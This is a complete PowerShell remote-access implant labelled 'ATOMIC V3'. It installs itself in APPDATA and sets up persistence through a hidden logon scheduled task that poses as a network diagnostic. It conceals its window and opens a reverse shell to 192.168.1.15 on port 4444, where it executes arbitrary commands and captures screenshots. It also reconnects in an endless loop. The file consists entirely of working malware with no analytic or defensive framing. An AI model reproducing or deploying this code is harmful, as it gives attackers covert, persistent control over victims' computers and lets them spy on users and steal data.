# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$taskName = "WinNetDiagnostic"
$installPath = "$env:APPDATA\win_diag.ps1"

# --- 1. PERSISTENCE CHECK & INSTALL ---
if ($PSCommandPath -ne $installPath) {
    Copy-Item -Path $PSCommandPath -Destination $installPath -Force
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -f `"$installPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Force
    }
}

# --- 2. INSTANT WINDOW HIDE ---
$code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util" -PassThru
$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) { $win::ShowWindow($hwnd, 0) }

# --- 3. CORE CONNECTION ---
try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true
    $w.WriteLine("--- ATOMIC V3 ACCESS: $env:COMPUTERNAME ($env:USERNAME) ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $raw = $r.ReadLine()
        if ($null -eq $raw -or $raw -eq "exit") { break }

        # --- BRANCHING LOGIC ---
        if ($raw.Trim() -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
            } catch { $w.WriteLine("Screenshot Failed: $($_.Exception.Message)") }
        } 
        else {
            # Execute command and catch errors so shell doesn't die
            $out = try { iex $raw 2>&1 | Out-String } catch { $_.Exception.Message }
            $w.WriteLine($out)
        }
    }
} catch {
    # If connection fails, wait 30s and try again (Infinite loop for persistence)
    Start-Sleep -Seconds 30
    & $PSCommandPath
} finally {
    if ($c) { $c.Close() }
}
